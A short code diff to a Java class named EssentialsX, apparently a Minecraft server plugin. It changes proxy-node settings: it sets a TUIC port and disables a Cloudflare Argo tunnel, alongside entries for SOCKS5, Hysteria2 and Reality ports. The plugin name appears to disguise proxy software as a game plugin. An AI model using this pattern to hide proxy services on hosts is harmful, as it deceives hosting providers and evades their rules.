@@ -93,7 +93,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
+        env.put("TUIC_PORT", "7029");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
@@ -103,7 +103,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "ip.sb");
         env.put("CFPORT", "443");
         env.put("NAME", getFullNodeName(localIP, localName));
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");   // 设置为 true 时禁用argo,false开启
 
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
